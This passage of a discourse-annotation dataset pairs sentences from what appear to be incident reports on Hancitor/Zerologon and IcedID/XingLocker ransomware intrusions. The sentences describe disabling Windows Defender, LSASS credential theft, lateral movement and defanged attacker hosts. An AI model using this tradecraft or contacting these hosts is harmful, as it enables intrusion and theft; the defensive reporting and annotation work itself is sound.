        "S1": "Like with many infections today, the threat actors gained initial access on a system through a malicious document email campaign, which made use of the Hancitor downloader.",
        "S2": "The document, upon opening and enabling of macros, would write and then execute a dll file from the users appdata folder.",
        "relation": "NEXT"
    },
    {
        "S1": "The document, upon opening and enabling of macros, would write and then execute a dll file from the users appdata folder.",
        "S2": "Various different enumeration and lateral movement tactics were observed on the network, along with the exploitation of Zerologon to elevate to domain administrator and gain full control over the domain.",
        "relation": "MISC"
    },
    {
        "S1": "Various different enumeration and lateral movement tactics were observed on the network, along with the exploitation of Zerologon to elevate to domain administrator and gain full control over the domain.",
        "S2": "The threat actor was able to go from zero access to domain admin, in just under one hour.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor was able to go from zero access to domain admin, in just under one hour.",
        "S2": "This report will go through an intrusion from July that began with an email, which included a link to Google\u2019s Feed Proxy service that was used to download a malicious Word document.",
        "relation": "MISC"
    },
    {
        "S1": "This report will go through an intrusion from July that began with an email, which included a link to Google\u2019s Feed Proxy service that was used to download a malicious Word document.",
        "S2": "Upon the user enabling macros, a Hancitor dll was executed, which called the usual suspect, Cobalt Strike.",
        "relation": "NEXT"
    },
    {
        "S1": "Upon the user enabling macros, a Hancitor dll was executed, which called the usual suspect, Cobalt Strike.",
        "S2": "Reviewing the document we can see the expected malicious macro and identify the location of a dll to be dropped in the:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Reviewing the document we can see the expected malicious macro and identify the location of a dll to be dropped in the:",
        "S2": "We can see that this relates to the path:",
        "relation": "ELABORATION"
    },
    {
        "S1": "We can see that this relates to the path:",
        "S2": "And once the dll \u201cier\u201d is written there, the macro proceeds to execute it.",
        "relation": "MISC"
    },
    {
        "S1": "And once the dll \u201cier\u201d is written there, the macro proceeds to execute it.",
        "S2": "Three files were downloaded by Hancitor from 4a5ikol[.]ru (8.211.241.0) including two Cobalt Strike stagers and Ficker Stealer.",
        "relation": "MISC"
    },
    {
        "S1": "Three files were downloaded by Hancitor from 4a5ikol[.]ru (8.211.241.0) including two Cobalt Strike stagers and Ficker Stealer.",
        "S2": "Hancitor then launched multiple instances of svchost.exe and process injected them with Cobalt Strike.",
        "relation": "NEXT"
    },
    {
        "S1": "Hancitor then launched multiple instances of svchost.exe and process injected them with Cobalt Strike.",
        "S2": "The following diagram shows the initial execution process from the WINWORD.exe to the Cobalt Strike Beacons that were injected into memory by Hancitor.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The following diagram shows the initial execution process from the WINWORD.exe to the Cobalt Strike Beacons that were injected into memory by Hancitor.",
        "S2": "Lastly, a Cobalt Strike command and control server was pinged before they copied the Cobalt Strike DLL and batch file, which were used to facilitate lateral movement.",
        "relation": "MISC"
    },
    {
        "S1": "Lastly, a Cobalt Strike command and control server was pinged before they copied the Cobalt Strike DLL and batch file, which were used to facilitate lateral movement.",
        "S2": "The batch file (cor.bat) is a 3-line script that will execute the Cobalt Strike DLL using rundll32.exe with a specific parameter.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The batch file (cor.bat) is a 3-line script that will execute the Cobalt Strike DLL using rundll32.exe with a specific parameter.",
        "S2": "The Cobalt Strike DLL used in this case resembles the same Cobalt Strike DLL seen in case 4301 based on the YARA rule associated to that case, indicating likely links between the actors in the two cases.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Cobalt Strike DLL used in this case resembles the same Cobalt Strike DLL seen in case 4301 based on the YARA rule associated to that case, indicating likely links between the actors in the two cases.",
        "S2": "The threat actor made use of a custom developed implementation of Zerologon (CVE-2020-1472) executed from a file named \u201czero.exe\u201d.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor made use of a custom developed implementation of Zerologon (CVE-2020-1472) executed from a file named \u201czero.exe\u201d.",
        "S2": "Once \u201czero.exe\u201d is run it will provide the threat actor with the NTLM hash of the specified username, a Domain Administrator account in this case.",
        "relation": "NEXT"
    },
    {
        "S1": "Once \u201czero.exe\u201d is run it will provide the threat actor with the NTLM hash of the specified username, a Domain Administrator account in this case.",
        "S2": "On the Domain Controller a service (Event ID 7045) will be created that will run the Reset-ComputerMachinePassword PowerShell Cmdlet.",
        "relation": "NEXT"
    },
    {
        "S1": "On the Domain Controller a service (Event ID 7045) will be created that will run the Reset-ComputerMachinePassword PowerShell Cmdlet.",
        "S2": "The service will then be executed and the machine account password will be reset.",
        "relation": "NEXT"
    },
    {
        "S1": "The service will then be executed and the machine account password will be reset.",
        "S2": "Zerologon will create an Event ID 4624 for the domain controller computer account attempting to authenticate.",
        "relation": "MISC"
    },
    {
        "S1": "Zerologon will create an Event ID 4624 for the domain controller computer account attempting to authenticate.",
        "S2": "The main red flag is the source network address IP differing from the IP of the domain controller, which in this case is set to the beachhead workstation on which zero.exe was executed.",
        "relation": "MISC"
    },
    {
        "S1": "The main red flag is the source network address IP differing from the IP of the domain controller, which in this case is set to the beachhead workstation on which zero.exe was executed.",
        "S2": "Lastly, Event ID 4648 will be logged on the beachhead machine indicating the zero.exe process was used to connect to a domain controller.",
        "relation": "NEXT"
    },
    {
        "S1": "Lastly, Event ID 4648 will be logged on the beachhead machine indicating the zero.exe process was used to connect to a domain controller.",
        "S2": "A blog post by Blackberry can be referenced to learn more about this custom developed Zerologon file used: https://blogs.blackberry.com/en/2021/03/zerologon-to-ransomware.",
        "relation": "MISC"
    },
    {
        "S1": "A blog post by Blackberry can be referenced to learn more about this custom developed Zerologon file used: https://blogs.blackberry.com/en/2021/03/zerologon-to-ransomware.",
        "S2": "For more information on detecting Zerologon check out Kroll\u2019s Zerologon Exploit Detect Cheat Sheet.",
        "relation": "ELABORATION"
    },
    {
        "S1": "For more information on detecting Zerologon check out Kroll\u2019s Zerologon Exploit Detect Cheat Sheet.",
        "S2": "Upon Hancitor launching on the system, it process injected into multiple instances of svchost.exe and rundll32.exe.",
        "relation": "MISC"
    },
    {
        "S1": "Upon Hancitor launching on the system, it process injected into multiple instances of svchost.exe and rundll32.exe.",
        "S2": "Memory segments can be seen allocated with Execute, Read, and Write permissions, indicating that executable code is stored.",
        "relation": "MISC"
    },
    {
        "S1": "Memory segments can be seen allocated with Execute, Read, and Write permissions, indicating that executable code is stored.",
        "S2": "Anomalous parent and child process relationships can be seen on the system that Hancitor was executed on, including rundll32.exe spawning svchost.exe and svchost.exe spawning cmd.exe.",
        "relation": "MISC"
    },
    {
        "S1": "Anomalous parent and child process relationships can be seen on the system that Hancitor was executed on, including rundll32.exe spawning svchost.exe and svchost.exe spawning cmd.exe.",
        "S2": "Moreover, the Cobalt Strike DLL stager was executed with a specific command line parameter which is used as a sandbox evasion feature.",
        "relation": "MISC"
    },
    {
        "S1": "Moreover, the Cobalt Strike DLL stager was executed with a specific command line parameter which is used as a sandbox evasion feature.",
        "S2": "In this case it is the number 11985756.",
        "relation": "MISC"
    },
    {
        "S1": "In this case it is the number 11985756.",
        "S2": "Lastly, a PowerShell loader named agent1.ps1 used heavy obfuscation to conceal the execution flow and hide the final shellcode.",
        "relation": "MISC"
    },
    {
        "S1": "Lastly, a PowerShell loader named agent1.ps1 used heavy obfuscation to conceal the execution flow and hide the final shellcode.",
        "S2": "After many iterations, the script would deobfuscate and run-in memory.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After many iterations, the script would deobfuscate and run-in memory.",
        "S2": "The shellcode is responsible for loading a PE file into memory and calling out to 64.235.39[.]32 for further instructions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The shellcode is responsible for loading a PE file into memory and calling out to 64.235.39[.]32 for further instructions.",
        "S2": "The only credential access observed was through Zerologon, which was used to retrieve the domain administrator\u2019s NTLM hash.",
        "relation": "MISC"
    },
    {
        "S1": "The only credential access observed was through Zerologon, which was used to retrieve the domain administrator\u2019s NTLM hash.",
        "S2": "Discovery started with a port scan initiated by the Hancitor dll.",
        "relation": "MISC"
    },
    {
        "S1": "Discovery started with a port scan initiated by the Hancitor dll.",
        "S2": "After SMB was scanned we saw scans of 5000/tcp, 9392/tcp, 6106/tcp.",
        "relation": "NEXT"
    },
    {
        "S1": "After SMB was scanned we saw scans of 5000/tcp, 9392/tcp, 6106/tcp.",
        "S2": "The threat actors were scanning for backup products such as Synology, Backup Exec and Veeam.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors were scanning for backup products such as Synology, Backup Exec and Veeam.",
        "S2": "This was followed by a battery of discovery command using the built in Microsoft utilities to discover domain controllers, administrators, connectivity checks and other items.",
        "relation": "NEXT"
    },
    {
        "S1": "This was followed by a battery of discovery command using the built in Microsoft utilities to discover domain controllers, administrators, connectivity checks and other items.",
        "S2": "Notice above, the threat actors pinged 190.114.254[.]116 which is one of the Cobalt Strike servers they later used.",
        "relation": "MISC"
    },
    {
        "S1": "Notice above, the threat actors pinged 190.114.254[.]116 which is one of the Cobalt Strike servers they later used.",
        "S2": "The threat actors enumerated local administrative access on remote systems by checking access to the C$ share for hosts discovered after the port scan.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors enumerated local administrative access on remote systems by checking access to the C$ share for hosts discovered after the port scan.",
        "S2": "We observed a PowerShell script named comp2.ps1 that was executed on every Domain Controller in the environment.",
        "relation": "MISC"
    },
    {
        "S1": "We observed a PowerShell script named comp2.ps1 that was executed on every Domain Controller in the environment.",
        "S2": "This script used the Active Directory RSAT module to get a list of computers and place them in a file named \u2018comps.txt.\u2019",
        "relation": "NEXT"
    },
    {
        "S1": "This script used the Active Directory RSAT module to get a list of computers and place them in a file named \u2018comps.txt.\u2019",
        "S2": "A program named check.exe was observed using the comps.txt text file.",
        "relation": "MISC"
    },
    {
        "S1": "A program named check.exe was observed using the comps.txt text file.",
        "S2": "This program will take a list of IP addresses and hostnames from comps.txt and check if they are online using ICMP.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This program will take a list of IP addresses and hostnames from comps.txt and check if they are online using ICMP.",
        "S2": "The online hosts will then be directed to the check.txt text file.",
        "relation": "MISC"
    },
    {
        "S1": "The online hosts will then be directed to the check.txt text file.",
        "S2": "The check.exe file contains three parameters that can be used one at a time:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The check.exe file contains three parameters that can be used one at a time:",
        "S2": "check .exe comps.txt check .txt -ip ( Check which hosts in comps.txt are alive, and write the IP to check .txt) check .exe comps.txt check .txt - name ( Check which hosts in comps.txt are alive, and write the hostname to check .txt) check .exe comps.txt check .txt - full ( Check which hosts in comps.txt are alive, and write the IP and hostname to check .txt)",
        "relation": "ELABORATION"
    },
    {
        "S1": "check .exe comps.txt check .txt -ip ( Check which hosts in comps.txt are alive, and write the IP to check .txt) check .exe comps.txt check .txt - name ( Check which hosts in comps.txt are alive, and write the hostname to check .txt) check .exe comps.txt check .txt - full ( Check which hosts in comps.txt are alive, and write the IP and hostname to check .txt)",
        "S2": "The threat actors pivoted towards multiple hosts on the domain from the beachhead.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors pivoted towards multiple hosts on the domain from the beachhead.",
        "S2": "The main actions involved copying a Cobalt Strike DLL beacon and a batch script to run the DLL (cor.dll, cor.bat, GAS.dll, GAS.bat).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The main actions involved copying a Cobalt Strike DLL beacon and a batch script to run the DLL (cor.dll, cor.bat, GAS.dll, GAS.bat).",
        "S2": "Operators executed the batch script through a remotely created service on the target system.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Operators executed the batch script through a remotely created service on the target system.",
        "S2": "The following shows one of the batch scripts used to run a Cobalt Strike payload.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The following shows one of the batch scripts used to run a Cobalt Strike payload.",
        "S2": "An obfuscated PowerShell script named \u2018agent1.ps1\u2019 was dropped on a machine through a Cobalt Strike Beacon.",
        "relation": "MISC"
    },
    {
        "S1": "An obfuscated PowerShell script named \u2018agent1.ps1\u2019 was dropped on a machine through a Cobalt Strike Beacon.",
        "S2": "The PowerShell script had instructions to deobfuscate shellcode and run it in memory as a thread in the same PowerShell process.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The PowerShell script had instructions to deobfuscate shellcode and run it in memory as a thread in the same PowerShell process.",
        "S2": "The shellcode itself also has a PE file embedded inside of itself.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The shellcode itself also has a PE file embedded inside of itself.",
        "S2": "Once the shellcode is running this PE file will be loaded into memory and executed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Once the shellcode is running this PE file will be loaded into memory and executed.",
        "S2": "You can see this from the memory dump MZ header denoting the PE binary loaded into the PowerShell process.",
        "relation": "ELABORATION"
    },
    {
        "S1": "You can see this from the memory dump MZ header denoting the PE binary loaded into the PowerShell process.",
        "S2": "The PE file is of a small size and has the capability to beacon out at regular intervals to a command-and-control server on 64.235.39[.]32 to retrieve instructions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The PE file is of a small size and has the capability to beacon out at regular intervals to a command-and-control server on 64.235.39[.]32 to retrieve instructions.",
        "S2": "The Visual C# Command Line Compiler was observed being invoked by the PowerShell script where the shellcode was executed.",
        "relation": "MISC"
    },
    {
        "S1": "The Visual C# Command Line Compiler was observed being invoked by the PowerShell script where the shellcode was executed.",
        "S2": "This is most likely instructions that the previously discussed PE file retrieved from the remote command and control server.",
        "relation": "MISC"
    },
    {
        "S1": "This is most likely instructions that the previously discussed PE file retrieved from the remote command and control server.",
        "S2": "Hancitor contacted its servers over HTTP and advertised details about the compromised machine, user, and domain while also retrieving instructions from the command and control server (1).",
        "relation": "MISC"
    },
    {
        "S1": "Hancitor contacted its servers over HTTP and advertised details about the compromised machine, user, and domain while also retrieving instructions from the command and control server (1).",
        "S2": "From another dedicated location, 4a5ikol[.]ru, two Cobalt Strike beacons and Ficker Stealer malware were downloaded through HTTP (2).",
        "relation": "MISC"
    },
    {
        "S1": "From another dedicated location, 4a5ikol[.]ru, two Cobalt Strike beacons and Ficker Stealer malware were downloaded through HTTP (2).",
        "S2": "A successful connection from Ficker Stealer was not observed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A successful connection from Ficker Stealer was not observed.",
        "S2": "A domain was queried; however, the response returned an error.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A domain was queried; however, the response returned an error.",
        "S2": "Cobalt Strike was also observed to be making use of HTTP.",
        "relation": "MISC"
    },
    {
        "S1": "Cobalt Strike was also observed to be making use of HTTP.",
        "S2": "Lastly, the shellcode executed by the agent1.ps1 PowerShell loader, was observed loading a PE file into memory that would beacon out at consistent intervals to 64.235.39[.]32.",
        "relation": "MISC"
    },
    {
        "S1": "Lastly, the shellcode executed by the agent1.ps1 PowerShell loader, was observed loading a PE file into memory that would beacon out at consistent intervals to 64.235.39[.]32.",
        "S2": "Further encrypted network activity was also observed to this IP address.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Further encrypted network activity was also observed to this IP address.",
        "S2": "Unfortunately, the tool sending these connections could not be definitively determined.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Unfortunately, the tool sending these connections could not be definitively determined.",
        "S2": "The user agent for this was curl/7.55.1",
        "relation": "ELABORATION"
    },
    {
        "S1": "The user agent for this was curl/7.55.1",
        "S2": "Similar to a previous case, the threat actors were evicted before completing their mission and as a result their final actions could not be observed.",
        "relation": "MISC"
    },
    {
        "S1": "This case started with an IcedID infection from a malware campaign as reported by Myrtus.",
        "S2": "As with most commodity malware we see, IcedID executes the initial discovery commands and then exfiltrates the results via the C2 channel.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As with most commodity malware we see, IcedID executes the initial discovery commands and then exfiltrates the results via the C2 channel.",
        "S2": "If threat actors find the organization to be of interest, they will launch the next phase.",
        "relation": "ELABORATION"
    },
    {
        "S1": "If threat actors find the organization to be of interest, they will launch the next phase.",
        "S2": "In some cases, there might be different threat actor groups working on different phases of the attack.",
        "relation": "MISC"
    },
    {
        "S1": "In some cases, there might be different threat actor groups working on different phases of the attack.",
        "S2": "In this instance, the threat actors instructed IcedID to download and execute the next stage malware two hours after the initial compromise.",
        "relation": "MISC"
    },
    {
        "S1": "In this instance, the threat actors instructed IcedID to download and execute the next stage malware two hours after the initial compromise.",
        "S2": "The payload was a Cobalt Strike Beacon in the form of a DLL.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The payload was a Cobalt Strike Beacon in the form of a DLL.",
        "S2": "Upon initial execution, Cobalt Strike ran some discovery commands before injecting into the LSASS process to steal cached credentials.",
        "relation": "NEXT"
    },
    {
        "S1": "Upon initial execution, Cobalt Strike ran some discovery commands before injecting into the LSASS process to steal cached credentials.",
        "S2": "The threat actors did not waste any time, and within four minutes, they gained administrative credentials then began searching for the domain controllers.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors did not waste any time, and within four minutes, they gained administrative credentials then began searching for the domain controllers.",
        "S2": "Once the domain controllers were identified, they used Cobalt Strike\u2019s \u201cjump psexec_psh\u201d capability, which creates a Windows service that executes a Beacon executable to move laterally.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the domain controllers were identified, they used Cobalt Strike\u2019s \u201cjump psexec_psh\u201d capability, which creates a Windows service that executes a Beacon executable to move laterally.",
        "S2": "Having gained access to the domain controllers, the attackers downloaded and executed AdFind to collect further information about the domain.",
        "relation": "NEXT"
    },
    {
        "S1": "Having gained access to the domain controllers, the attackers downloaded and executed AdFind to collect further information about the domain.",
        "S2": "The attacker\u2019s preferred scripting various parts of the intrusion via batch scripts.",
        "relation": "MISC"
    },
    {
        "S1": "The attacker\u2019s preferred scripting various parts of the intrusion via batch scripts.",
        "S2": "They had a script for persistence, defense evasion and execution tasks.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They had a script for persistence, defense evasion and execution tasks.",
        "S2": "A complete list of those scripts came from hxxps://styservice[.]com as we shared with the community in this tweet thread.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A complete list of those scripts came from hxxps://styservice[.]com as we shared with the community in this tweet thread.",
        "S2": "The first batch script we saw was to schedule a task which would execute a command to load a Cobalt Strike Beacon into memory using regsvr32.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first batch script we saw was to schedule a task which would execute a command to load a Cobalt Strike Beacon into memory using regsvr32.",
        "S2": "This persistence mechanism was only seen on the domain controllers and one other critical server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This persistence mechanism was only seen on the domain controllers and one other critical server.",
        "S2": "The lateral movement and execution of batch scripts continued with the operators expanding their network footprint.",
        "relation": "MISC"
    },
    {
        "S1": "The lateral movement and execution of batch scripts continued with the operators expanding their network footprint.",
        "S2": "It is worth mentioning that it appears they chose which hosts to pivot to by assessing the importance implied by their hostnames.",
        "relation": "MISC"
    },
    {
        "S1": "It is worth mentioning that it appears they chose which hosts to pivot to by assessing the importance implied by their hostnames.",
        "S2": "After landing on an \u201cimportant\u201d host, the first task was to execute various batch scripts to disable antivirus programs.",
        "relation": "NEXT"
    },
    {
        "S1": "After landing on an \u201cimportant\u201d host, the first task was to execute various batch scripts to disable antivirus programs.",
        "S2": "On one host, common backup utilities were also disabled.",
        "relation": "ELABORATION"
    },
    {
        "S1": "On one host, common backup utilities were also disabled.",
        "S2": "Three hours into the intrusion and the attackers had deployed Beacons across various hosts on the network.",
        "relation": "NEXT"
    },
    {
        "S1": "Three hours into the intrusion and the attackers had deployed Beacons across various hosts on the network.",
        "S2": "Despite that, they deployed another Beacon using a PowerShell loader method, this time on the beachhead.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Despite that, they deployed another Beacon using a PowerShell loader method, this time on the beachhead.",
        "S2": "They used this Beacon to run PowerView\u2019s Invoke-ShareFinder module in an effort to discover potentially interesting directories and files.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They used this Beacon to run PowerView\u2019s Invoke-ShareFinder module in an effort to discover potentially interesting directories and files.",
        "S2": "BloodHound was also executed as part their reconnaissance activities.",
        "relation": "ELABORATION"
    },
    {
        "S1": "BloodHound was also executed as part their reconnaissance activities.",
        "S2": "At the same time, the operators performed an exhaustive port scan on the servers they had earlier identified to be \u201cimportant\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "At the same time, the operators performed an exhaustive port scan on the servers they had earlier identified to be \u201cimportant\u201d.",
        "S2": "Minutes away from meeting their final objective, the operators manually searched for files and directories of interest for the second time.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Minutes away from meeting their final objective, the operators manually searched for files and directories of interest for the second time.",
        "S2": "Around 23 hours after the initial intrusion, the threat actors moved towards their final objective of deploying XingLocker ransomware.",
        "relation": "NEXT"
    },
    {
        "S1": "Around 23 hours after the initial intrusion, the threat actors moved towards their final objective of deploying XingLocker ransomware.",
        "S2": "The deployment took place via wmic and batch scripts.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The deployment took place via wmic and batch scripts.",
        "S2": "We did not observe any overt exfiltration of data; however, it is possible that the threat actors used Cobalt Strike to transmit sensitive data.",
        "relation": "MISC"
    },
    {
        "S1": "We did not observe any overt exfiltration of data; however, it is possible that the threat actors used Cobalt Strike to transmit sensitive data.",
        "S2": "The IcedID infection came as a result of a phishing campaign as reported by Myrtus on Twitter.",
        "relation": "MISC"
    },
    {
        "S1": "The IcedID infection came as a result of a phishing campaign as reported by Myrtus on Twitter.",
        "S2": "Initial IcedID was executed on the beachhead using regsvr32.exe",
        "relation": "NEXT"
    },
    {
        "S1": "Initial IcedID was executed on the beachhead using regsvr32.exe",
        "S2": "Automated analysis of this IcedID sample extracts the following configuration for the staging server:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Automated analysis of this IcedID sample extracts the following configuration for the staging server:",
        "S2": "IcedID core analysis show additional C2 infrastructure as per this sample:",
        "relation": "ELABORATION"
    },
    {
        "S1": "IcedID core analysis show additional C2 infrastructure as per this sample:",
        "S2": "Upon the execution of the IcedID sample, we observed a download and execution of a malicious DLL ikaqkk.dll :",
        "relation": "MISC"
    },
    {
        "S1": "Upon the execution of the IcedID sample, we observed a download and execution of a malicious DLL ikaqkk.dll :",
        "S2": "Below is a screenshot of packet where we can spot the GZIPLOADER downloading the first stage from the C2:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Below is a screenshot of packet where we can spot the GZIPLOADER downloading the first stage from the C2:",
        "S2": "A detailed GZIPLOADER analysis from Binary Defense is available here.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A detailed GZIPLOADER analysis from Binary Defense is available here.",
        "S2": "The DLL was then executed using rundll32.exe one second later:",
        "relation": "MISC"
    },
    {
        "S1": "The DLL was then executed using rundll32.exe one second later:",
        "S2": "Cobalt strike Beacon DLLHost.exe was downloaded and loaded via process hollowing a few hours after the initial IcedID execution:",
        "relation": "MISC"
    },
    {
        "S1": "Cobalt strike Beacon DLLHost.exe was downloaded and loaded via process hollowing a few hours after the initial IcedID execution:",
        "S2": "The threat actors connected to the machine to run the first discovery commands using Cobalt Strike Beacon.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors connected to the machine to run the first discovery commands using Cobalt Strike Beacon.",
        "S2": "The threat actors then downloaded an additional Cobalt Strike Beacon kaslose.dll via curl and executed it via regsvr32 :",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors then downloaded an additional Cobalt Strike Beacon kaslose.dll via curl and executed it via regsvr32 :",
        "S2": "The Threat actors also executed HTA and PowerShell loader to load Cobalt Strike Beacon in memory on beachhead:",
        "relation": "NEXT"
    },
    {
        "S1": "The Threat actors also executed HTA and PowerShell loader to load Cobalt Strike Beacon in memory on beachhead:",
        "S2": "Upon IcedID execution, a scheduled task named {3D0CCC72-D85D-7A63-8C0A-66CF5BAFD686} was created.",
        "relation": "MISC"
    },
    {
        "S1": "Upon IcedID execution, a scheduled task named {3D0CCC72-D85D-7A63-8C0A-66CF5BAFD686} was created.",
        "S2": "The task was scheduled to execute every hour:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The task was scheduled to execute every hour:",
        "S2": "The new scheduled task was registered under EID 106 as seen below.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The new scheduled task was registered under EID 106 as seen below.",
        "S2": "(EIDs: 106,200,201 \u201cMicrosoft-Windows-TaskScheduler\\Operational.evtx\u201d)",
        "relation": "MISC"
    },
    {
        "S1": "(EIDs: 106,200,201 \u201cMicrosoft-Windows-TaskScheduler\\Operational.evtx\u201d)",
        "S2": "Correlating this with Process Execution logs from MDE, shows that the task was executing the IcedID downloaded DLL:",
        "relation": "MISC"
    },
    {
        "S1": "Correlating this with Process Execution logs from MDE, shows that the task was executing the IcedID downloaded DLL:",
        "S2": "While analyzing this intrusion, we observed further persistence via scheduled tasks associated with post-exploitation activities.",
        "relation": "MISC"
    },
    {
        "S1": "While analyzing this intrusion, we observed further persistence via scheduled tasks associated with post-exploitation activities.",
        "S2": "This scheduled task with name HpSupport executed a Cobalt Strike Beacon kaslose64.dll both on the Domain Controller and the File Server:",
        "relation": "ELABORATION"
    },
    {
        "S1": "This scheduled task with name HpSupport executed a Cobalt Strike Beacon kaslose64.dll both on the Domain Controller and the File Server:",
        "S2": "On the File Server, the same Scheduled task was created with a slightly different name:",
        "relation": "ELABORATION"
    },
    {
        "S1": "On the File Server, the same Scheduled task was created with a slightly different name:",
        "S2": "The star.bat script contained the following lines in both cases:",
        "relation": "MISC"
    },
    {
        "S1": "The star.bat script contained the following lines in both cases:",
        "S2": "IcedID reached out to 37.120.222[.]100:8080 to download and load Cobalt Strike Beacon via process hollowing technique:",
        "relation": "MISC"
    },
    {
        "S1": "IcedID reached out to 37.120.222[.]100:8080 to download and load Cobalt Strike Beacon via process hollowing technique:",
        "S2": "The threat actors executed a 1698 line batch script kasper.bat on a file server, which kills multiple processes using taskill, stops/disables several services using net stop and sc config and disables a number of security tools using WMI.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors executed a 1698 line batch script kasper.bat on a file server, which kills multiple processes using taskill, stops/disables several services using net stop and sc config and disables a number of security tools using WMI.",
        "S2": "Here is an extract from the kasper.bat script:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Here is an extract from the kasper.bat script:",
        "S2": "Disabling Windows Defender using multiple techniques",
        "relation": "MISC"
    },
    {
        "S1": "Disabling Windows Defender using multiple techniques",
        "S2": "The threat actors executed three other scripts named fed1.bat , fed2.bat and fed3.bat using PowerShell and manipulating several registry keys to disable Windows Defender.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors executed three other scripts named fed1.bat , fed2.bat and fed3.bat using PowerShell and manipulating several registry keys to disable Windows Defender.",
        "S2": "Content of fed1.bat script:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Content of fed1.bat script:",
        "S2": "Content of fed2.bat script:",
        "relation": "LIST"
    },
    {
        "S1": "Content of fed2.bat script:",
        "S2": "Content of fed3.bat script:",
        "relation": "LIST"
    },
    {
        "S1": "Content of fed3.bat script:",
        "S2": "It appears that the information from these 3 scripts were lifted from the first revision of Revisions \u00b7 quick-disable-windows-defender.bat \u00b7 GitHub.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It appears that the information from these 3 scripts were lifted from the first revision of Revisions \u00b7 quick-disable-windows-defender.bat \u00b7 GitHub.",
        "S2": "Fed1 is half of that batch file and Fed2 is the other half.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Fed1 is half of that batch file and Fed2 is the other half.",
        "S2": "Fed3 is a complete copy.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Fed3 is a complete copy.",
        "S2": "This tells us that the threat actor was not aware of what was in these scripts or else they wouldn\u2019t have ran fed1/fed2 and fed3 considering they do the same thing.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This tells us that the threat actor was not aware of what was in these scripts or else they wouldn\u2019t have ran fed1/fed2 and fed3 considering they do the same thing.",
        "S2": "The threat actors injected into a high privileged process and then access cached credentials from LSASS:",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors injected into a high privileged process and then access cached credentials from LSASS:",
        "S2": "Related named pipe activity based on Cobalt Strike patterns for using Mimikatz Pass-The-Hash function to run local and remote commands.",
        "relation": "MISC"
    },
    {
        "S1": "Related named pipe activity based on Cobalt Strike patterns for using Mimikatz Pass-The-Hash function to run local and remote commands.",
        "S2": "The named pipe was used to pass the results back to the Beacon process.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The named pipe was used to pass the results back to the Beacon process.",
        "S2": "Windows EID: 4673 \u2013 A privileged service was called:",
        "relation": "MISC"
    },
    {
        "S1": "Windows EID: 4673 \u2013 A privileged service was called:",
        "S2": "Several discovery commands executed from IcedID after the initial execution:",
        "relation": "MISC"
    },
    {
        "S1": "Several discovery commands executed from IcedID after the initial execution:",
        "S2": "Cobalt Strike\u2019s appino Beacon, ran discovery commands upon initial execution:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Cobalt Strike\u2019s appino Beacon, ran discovery commands upon initial execution:",
        "S2": "Discovering domain controllers prior to pivoting:",
        "relation": "LIST"
    },
    {
        "S1": "Discovering domain controllers prior to pivoting:",
        "S2": "After discovering and pivoting to the Domain Controller, threat actors used both AdFind and BloodHound to explore the Active Directory Domain.",
        "relation": "NEXT"
    },
    {
        "S1": "After discovering and pivoting to the Domain Controller, threat actors used both AdFind and BloodHound to explore the Active Directory Domain.",
        "S2": "Executing Adfind on the Domain Controller:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Executing Adfind on the Domain Controller:",
        "S2": "Evidence of BloodHound execution on the Domain Controller:",
        "relation": "MISC"
    },
    {
        "S1": "Evidence of BloodHound execution on the Domain Controller:",
        "S2": "The threat actors also executed PowerView Invoke-ShareFinder module on the beachhead host:",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors also executed PowerView Invoke-ShareFinder module on the beachhead host:",
        "S2": "Decoded command:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Decoded command:",
        "S2": "The threat actors also executed PowerView Invoke-FindLocalAdminAccess module on one of the compromised servers:",
        "relation": "MISC"
